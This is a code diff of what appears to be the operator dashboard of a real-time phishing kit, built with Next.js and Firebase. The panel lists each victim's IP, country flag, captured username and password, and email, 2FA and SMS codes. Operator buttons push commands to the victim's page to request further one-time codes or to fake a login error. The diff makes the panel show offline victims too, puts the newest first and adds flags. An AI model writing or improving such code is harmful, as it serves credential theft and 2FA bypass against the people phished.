@@ -2,6 +2,7 @@
 
 import { database } from "@/firebase";
 import { onValue, ref, update } from "firebase/database";
+import Image from "next/image";
 import { useEffect, useRef, useState } from "react";
 
 interface IInfo {
@@ -41,9 +42,7 @@ export default function PanelPage() {
           if (data[key]) {
             Object.keys(data[key]).forEach((c) => {
               const valueRow = data[key][c];
-              if (valueRow.online) {
-                dataSet[c] = valueRow;
-              }
+              dataSet[c] = valueRow;
             });
           }
         });
@@ -130,110 +129,123 @@ export default function PanelPage() {
                 </tr>
               </thead>
               <tbody className="rounded-3xl">
-                {Object.keys(dataInfos).map((key, idx) => {
-                  const data = dataInfos[key];
-                  const id = key;
-                  const ip = data.ip.replaceAll(".", ",");
-                  return (
-                    <tr key={key} className="bg-zinc-500">
-                      <td className="px-6 py-4 font-medium text-base text-white text-center flex flex-row gap-2">
-                        {data.ip}
-                      </td>
-                      <td className="px-6 py-4 font-medium text-base text-white text-center text-wrap">
-                        {data.username !== "" ? (
-                          <SpanValueText text={data.username} />
-                        ) : (
-                          "N/A"
-                        )}
-                      </td>
-                      <td className="px-6 py-4 font-medium text-base text-white text-center">
-                        {data.password !== "" ? (
-                          <SpanValueText text={data.password} />
-                        ) : (
-                          "N/A"
-                        )}
-                      </td>
-                      <td className="px-6 py-4 font-medium text-base text-white text-center">
-                        {data.emailCode !== "" ? (
-                          <SpanValueText text={data.emailCode} />
-                        ) : data.command.includes("CONFIRM") ? (
-                          <div className="flex w-full justify-center  items-center">
-                            <button
-                              onClick={() => handleCommand("W_SEC_2", ip, id)}
-                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                            >
-                              GET CODE
-                            </button>
-                          </div>
-                        ) : (
-                          "N/A"
-                        )}
-                      </td>
+                {Object.keys(dataInfos)
+                  .reverse()
+                  .map((key, idx) => {
+                    const data = dataInfos[key];
+                    const id = key;
+                    const ip = data.ip.replaceAll(".", ",");
+                    return (
+                      <tr
+                        key={key}
+                        className={`${
+                          !data.online ? "bg-zinc-700" : "bg-zinc-500"
+                        }`}
+                      >
+                        <td className="px-6 py-4 font-medium text-base items-center text-white text-center flex flex-row gap-2">
+                          <Image
+                            src={`https://flagsapi.com/${data.zone}/flat/64.png`}
+                            width={28}
+                            height={28}
+                            alt="Flag"
+                          />
+                          - {data.ip}
+                        </td>
+                        <td className="px-6 py-4 font-medium text-base text-white text-center text-wrap">
+                          {data.username !== "" ? (
+                            <SpanValueText text={data.username} />
+                          ) : (
+                            "N/A"
+                          )}
+                        </td>
+                        <td className="px-6 py-4 font-medium text-base text-white text-center">
+                          {data.password !== "" ? (
+                            <SpanValueText text={data.password} />
+                          ) : (
+                            "N/A"
+                          )}
+                        </td>
+                        <td className="px-6 py-4 font-medium text-base text-white text-center">
+                          {data.emailCode !== "" ? (
+                            <SpanValueText text={data.emailCode} />
+                          ) : data.command.includes("CONFIRM") ? (
+                            <div className="flex w-full justify-center  items-center">
+                              <button
+                                onClick={() => handleCommand("W_SEC_2", ip, id)}
+                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                              >
+                                GET CODE
+                              </button>
+                            </div>
+                          ) : (
+                            "N/A"
+                          )}
+                        </td>
 
-                      <td className="px-6 py-4 font-medium text-base text-white text-center items-center">
-                        {data.twoAF !== "" ? (
-                          <SpanValueText text={data.twoAF} />
-                        ) : data.command.includes("CONFIRM") ? (
-                          <div className="flex w-full justify-center  items-center">
-                            <button
-                              onClick={() => handleCommand("W_SEC_1", ip, id)}
-                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                            >
-                              GET CODE
-                            </button>
-                          </div>
-                        ) : (
-                          "N/A"
-                        )}
-                      </td>
+                        <td className="px-6 py-4 font-medium text-base text-white text-center items-center">
+                          {data.twoAF !== "" ? (
+                            <SpanValueText text={data.twoAF} />
+                          ) : data.command.includes("CONFIRM") ? (
+                            <div className="flex w-full justify-center  items-center">
+                              <button
+                                onClick={() => handleCommand("W_SEC_1", ip, id)}
+                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                              >
+                                GET CODE
+                              </button>
+                            </div>
+                          ) : (
+                            "N/A"
+                          )}
+                        </td>
 
-                      <td className="px-6 py-4 font-medium text-base text-white text-center">
-                        {data.smsCode !== "" ? (
-                          <SpanValueText text={data.smsCode} />
-                        ) : data.command.includes("CONFIRM") ? (
-                          <div className="flex w-full justify-center  items-center">
-                            <button
-                              onClick={() => handleCommand("W_SEC_3", ip, id)}
-                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                            >
-                              GET CODE
-                            </button>
-                          </div>
-                        ) : (
-                          "N/A"
-                        )}
-                      </td>
-                      <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
-                        {data.command === "W_LOGIN_CONFIRM" ? (
-                          <>
-                            <button
-                              onClick={() =>
-                                handleCommand("W_LOGIN_ERROR", ip, id)
-                              }
-                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                            >
-                              ERROR
-                            </button>
-                          </>
-                        ) : data.command.includes("W_SEC") &&
-                          data.command.includes("CONFIRM") ? (
-                          <>
-                            <button
-                              onClick={() => {
-                                const ref = data.command.split("_")[2];
-                                const code = `W_SEC_${ref}_ERROR`;
-                                handleCommand(code, ip, id);
-                              }}
-                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
-                            >
-                              ERROR
-                            </button>
-                          </>
-                        ) : null}
-                      </td>
-                    </tr>
-                  );
-                })}
+                        <td className="px-6 py-4 font-medium text-base text-white text-center">
+                          {data.smsCode !== "" ? (
+                            <SpanValueText text={data.smsCode} />
+                          ) : data.command.includes("CONFIRM") ? (
+                            <div className="flex w-full justify-center  items-center">
+                              <button
+                                onClick={() => handleCommand("W_SEC_3", ip, id)}
+                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                              >
+                                GET CODE
+                              </button>
+                            </div>
+                          ) : (
+                            "N/A"
+                          )}
+                        </td>
+                        <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
+                          {data.command === "W_LOGIN_CONFIRM" ? (
+                            <>
+                              <button
+                                onClick={() =>
+                                  handleCommand("W_LOGIN_ERROR", ip, id)
+                                }
+                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                              >
+                                ERROR
+                              </button>
+                            </>
+                          ) : data.command.includes("W_SEC") &&
+                            data.command.includes("CONFIRM") ? (
+                            <>
+                              <button
+                                onClick={() => {
+                                  const ref = data.command.split("_")[2];
+                                  const code = `W_SEC_${ref}_ERROR`;
+                                  handleCommand(code, ip, id);
+                                }}
+                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                              >
+                                ERROR
+                              </button>
+                            </>
+                          ) : null}
+                        </td>
+                      </tr>
+                    );
+                  })}
               </tbody>
             </table>
           </div>
